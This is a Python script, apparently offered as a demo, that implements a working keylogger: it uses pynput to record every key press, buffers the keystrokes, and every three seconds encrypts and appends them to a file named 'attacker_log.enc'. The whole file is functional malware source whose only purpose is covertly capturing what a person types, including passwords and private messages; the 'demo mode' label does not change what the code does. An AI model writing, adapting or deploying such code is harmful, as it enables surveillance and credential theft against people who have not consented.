# -*- coding: utf-8 -*-

from pynput import keyboard
from cryptography.fernet import Fernet
import time
import threading

# -----------------------------
# FILE SETUP
# -----------------------------
log_file = "attacker_log.enc"

# NOTE: for demo only (normally stored securely)
key = Fernet.generate_key()
cipher = Fernet(key)

# -----------------------------
# BUFFER
# -----------------------------
buffer = []
lock = threading.Lock()

# -----------------------------
# LOGIC: encrypt + append
# -----------------------------
def write_chunk(chunk):
    data = "".join(chunk).encode()
    encrypted = cipher.encrypt(data)

    # APPEND mode (IMPORTANT FIX)
    with open(log_file, "ab") as f:
        f.write(encrypted + b"\n")

# -----------------------------
# KEY PRESS HANDLER (REAL TIME)
# -----------------------------
def on_press(key):
    try:
        k = key.char
    except:
        k = str(key)

    with lock:
        buffer.append(k)

# -----------------------------
# BACKGROUND FLUSHER (every 2–3 sec)
# -----------------------------
def flush_buffer():
    while True:
        time.sleep(3)

        with lock:
            if buffer:
                chunk = buffer.copy()
                buffer.clear()
            else:
                continue

        write_chunk(chunk)

# -----------------------------
# START KEYLOGGER
# -----------------------------
listener = keyboard.Listener(on_press=on_press)
listener.start()

# background thread for periodic saving
threading.Thread(target=flush_buffer, daemon=True).start()

print("Keylogger running (demo mode)...")

listener.join()
